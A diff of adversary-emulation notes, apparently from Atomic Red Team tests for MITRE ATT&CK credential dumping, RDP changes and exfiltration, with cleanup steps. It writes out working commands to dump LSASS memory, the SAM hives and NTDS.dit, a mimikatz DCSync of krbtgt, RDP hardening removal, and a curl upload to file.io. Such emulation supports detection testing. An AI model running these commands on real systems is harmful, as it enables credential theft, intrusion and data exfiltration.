@@ -1,4 +1,4 @@
-T1003.001.md
+################T1003.001.md################
 
 ## Atomic Test #1 - Dump LSASS.exe Memory using ProcDump
 
@@ -8,20 +8,23 @@ procdump.exe -accepteula -ma lsass.exe .\T1003-001.dmp
 #Borrado
 del T1003-001.dmp >nul 2> nul
 
+
 ## Atomic Test #3 - Dump LSASS.exe Memory using direct system calls and API unhooking
 
-https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe
+cd Outflank-Dumpert
+Outflank-Dumpert.exe
+
+#Borrado
+del C:\windows\temp\dumpert.dmp >nul 2> nul
 
 ## Atomic Test #4 - Dump LSASS.exe Memory using NanoDump
-
 ## Atomic Test #6 - Offline Credential Theft With Mimikatz
-
 ## Atomic Test #7 - LSASS read with pypykatz
-
 ## Atomic Test #9 - Create Mini Dump of LSASS.exe using ProcDump
 
 
-T1003.002.md
+################T1003.002.md################
+
 ## Atomic Test #1 - Registry dump of SAM, creds, and secrets
 
 reg save HKLM\sam %temp%\sam
@@ -37,7 +40,7 @@ del %temp%\security >nul 2> nul
 
 ## Atomic Test #3 - esentutl.exe SAM copy
 
-esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp% /SAM
+esentutl.exe /y %SystemRoot%\system32\config\SAM /d %temp%\SAM
 
 #Borrado
 del%temp%\SAM
@@ -49,9 +52,11 @@ for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\Hard
 #Borrado
 for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
 
-T1003.003.md
+################T1003.003.md ################
 
 ## Atomic Test #1 - Create Volume Shadow Copy with vssadmin
+
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
 vssadmin.exe create shadow /for=C:
 
 ## Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
@@ -60,19 +65,70 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Wi
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
 reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
 
+#Borrado
+del "C:\Windows\Temp\ntds.dit"        >nul 2> nul
+del "C:\Windows\Temp\VSC_SYSTEM_HIVE" >nul 2> nul
+del "C:\Windows\Temp\SYSTEM_HIVE"     >nul 2> nul
 
-Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"
+## Atomic Test #3 - Dump Active Directory Database with NTDSUtil
 
-T1003.004.md
-T1003.005.md
-T1003.006.md
-T1003.md
+mkdir C:\Windows\Temp\ntds_T1003
+ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
+
+#Borrado
+rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
+
+
+################T1003.004.md################
+
+cd PsExec
+PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
+
+#Borrado
+del %temp%\secrets >nul 2> nul
+
+################T1003.005.md################
+
+#### Attack Commands: Run with `command_prompt`! 
+
+cmdkey /list
+
+################T1003.006.md################
+
+## Atomic Test #1 - DCSync (Active Directory)
+
+cd mimikatz
+mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"
+
+################T1003.md################
+
+
 T1007.md
 T1010.md
 T1012.md
 T1016.md
 T1018.md
-T1021.001.md
+################T1021.001.md################
+
+## Atomic Test #3 - Changing RDP Port to Non Standard Port via Command_Prompt
+
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f
+netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
+
+#Borrado
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f >nul 2>&1
+netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
+net stop TermService /y >nul 2>&1
+net start TermService >nul 2>&1
+
+## Atomic Test #4 - Disable NLA for RDP via Command Prompt
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
+
+#Borrado
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 1 /t REG_DWORD -f >nul 2>&1
+
+
 T1021.002.md
 T1027.004.md
 T1027.md
@@ -83,7 +139,14 @@ T1037.001.md
 T1039.md
 T1040.md
 T1047.md
-T1048.002.md
+################T1048.002.md################
+
+#Atomic Test #1 - Exfiltrate data HTTPS using curl windows#
+
+#Llevar curl descargado y un archivo llamado artifact
+cp curl.exe C:\Windows\System32\Curl.exe
+C:\Windows\System32\Curl.exe -F 'file=@artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+
 T1049.md
 T1053.002.md
 T1053.005.md
